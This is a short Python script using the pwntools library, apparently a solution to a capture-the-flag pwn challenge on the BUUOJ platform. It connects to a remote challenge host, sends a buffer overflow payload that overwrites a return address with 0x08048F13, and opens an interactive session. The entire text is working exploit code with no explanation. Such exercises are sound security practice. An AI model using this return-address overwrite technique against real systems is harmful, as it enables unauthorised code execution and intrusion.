from pwn import *
sh=remote("node4.buuoj.cn",29722)
#sh=process("./timu")
payload=21*b'I'+b'a'+p32(0x08048F13)
sh.send(payload)
sh.interactive()
